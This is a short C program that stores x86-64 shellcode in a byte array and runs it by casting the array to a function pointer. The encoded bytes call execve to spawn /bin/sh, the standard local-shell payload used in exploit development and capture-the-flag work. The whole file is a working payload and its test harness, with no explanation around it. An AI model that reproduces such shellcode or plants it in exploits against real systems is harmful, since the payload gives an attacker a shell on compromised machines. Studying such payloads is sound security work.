char shellcode[] = "jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05";

int main() {
	void (*fptr)() = shellcode;
	fptr();
}
